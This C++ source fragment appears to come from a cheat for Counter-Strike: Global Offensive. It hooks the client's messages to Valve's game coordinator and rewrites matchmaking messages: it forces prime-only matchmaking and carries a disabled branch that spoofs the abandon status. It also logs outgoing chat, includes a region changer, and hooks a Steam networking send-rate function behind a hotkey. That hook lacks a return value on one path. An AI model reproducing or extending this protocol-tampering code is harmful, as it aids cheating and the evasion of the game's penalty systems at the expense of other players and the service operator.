  k_EMsgGCCStrike15_v2_Party_Invite = 9192,
  k_EMsgGCCStrike15_v2_Account_RequestCoPlays = 9193,
  k_EMsgGCCStrike15_v2_ClientGCRankUpdate = 9194,
  k_EMsgGCCStrike15_v2_ClientRequestOffers = 9195,
  k_EMsgGCCStrike15_v2_ClientAccountBalance = 9196,
  k_EMsgGCCStrike15_v2_ClientPartyJoinRelay = 9197,
  k_EMsgGCCStrike15_v2_ClientPartyWarning = 9198,
  k_EMsgGCCStrike15_v2_SetEventFavorite = 9200,
  k_EMsgGCCStrike15_v2_GetEventFavorites_Request = 9201,
  k_EMsgGCCStrike15_v2_ClientPerfReport = 9202,
  k_EMsgGCCStrike15_v2_GetEventFavorites_Response = 9203,
  k_EMsgGCCStrike15_v2_ClientRequestSouvenir = 9204,
  k_EMsgGCCStrike15_v2_ClientReportValidation = 9205,
  k_EMsgGCCStrike15_v2_GC2ClientRefuseSecureMode = 9206,
  k_EMsgGCCStrike15_v2_GC2ClientRequestValidation = 9207
};
	
	*/

//k_EMsgGCCStrike15_v2_ServerNotificationForUserPenalty

//CMsgGCCStrike15_v2_MatchmakingGC2ClientAbandon AbandonPacket;
//AbandonPacket.se

	int ret = -1;
		



	if (type == k_EMsgGCCStrike15_v2_MatchmakingStop && 0) {
		CMsgGCCStrike15_v2_MatchmakingStop Message;
		Message.ParseFromArray((void*)(((std::uintptr_t)Params.pubData) + 8), Params.cubData - 8);
		Message.set_abandon(0);	
		const auto size = Message.ByteSize() + 8;
		const auto buffer = new std::uint8_t[size];
		auto status = EGCResults{};

		std::memcpy(buffer, Params.pubData, 8);
		if (Message.SerializeToArray(buffer + 8, size - 8)) {
			Debug::QuickPrint("Writing Pings");
			status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, buffer, size));
		}
		else {
			Debug::QuickPrint("failed to serialize spoofed abandon status!");
			status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, Params.pubData, Params.cubData));
		}
		delete[] buffer;
		return status;
	}


	if (type == k_EMsgGCCStrike15_v2_MatchmakingStart) {
		CMsgGCCStrike15_v2_MatchmakingStart Message;
		Message.ParseFromArray((void*)(((std::uintptr_t)Params.pubData) + 8), Params.cubData - 8);
		Message.set_prime_only(1);
		const auto size = Message.ByteSize() + 8;
		const auto buffer = new std::uint8_t[size];
		auto status = EGCResults{};

		std::memcpy(buffer, Params.pubData, 8);
		if (Message.SerializeToArray(buffer + 8, size - 8)) {
			Debug::QuickPrint("Prime Only?");
			status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, buffer, size));
		}
		else {
			Debug::QuickPrint("failed to Matchmaking Start!");
			status = static_cast<EGCResults>(hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, Params.pubData, Params.cubData));
		}
		delete[] buffer;
		return status;
	}

	
	if (type == k_EMsgGCCStrike15_v2_Client2GCTextMsg) {
		memory->conColorMsg({ 255,255,0 }, "k_EMsgGCCStrike15_v2_Client2GCTextMsg Out To Valve Game-Coordinator\n");
		CMsgGCCStrike15_v2_ClientToGCChat TextMsg;
		Debug::QuickPrint("k_EMsgGCCStrike15_v2_Client2GCTextMsg");
		TextMsg.ParseFromArray((void*)(((std::uintptr_t)Params.pubData) + 8), Params.cubData - 8);
		if (TextMsg.has_match_id()) {
			Debug::QuickPrint("Has Match ID");
		}
		if (TextMsg.has_text()) {
			Debug::QuickPrint(TextMsg.text().c_str());
		}
	}






	if (config->RegionChanger.enabled) {
		return RegionPicker(Params);
	}

	if (ret == _SHOULD_CALL_ORIGINAL) {
		return hooks->gameCoordinator.callOriginal<int, 0>(Params.unMsgType, Params.pubData, Params.cubData);
	}
	else {
		return ret;
	}



}
/*

EGCResults __fastcall hk_SendMessage(void* ecx, void* edx, uint32_t unMsgType, const void* pubData, uint32_t cubData)
{


	return oSendMessage(ecx, edx, unMsgType, pubData, cubData);
}
*/

int __fastcall OurSteamWorks::CSteamNetworkConnectionBase__SNP_ClampSendRate(void* _this, void* edx) {
	if (GetAsyncKeyState(config->TestShit.fuckKey2)) {
		return *((DWORD*)_this + 3936);
	}
}
/*
struct CSteamNetworkingMessage {
	int32_t nUnknown;
	int32_t m_nCbSize;
	char m_pad[180];
	int8_t m_nFlags;
	char m_pad2[11];
	int32_t m_cbSNPSendReliableHeader;
};
*/



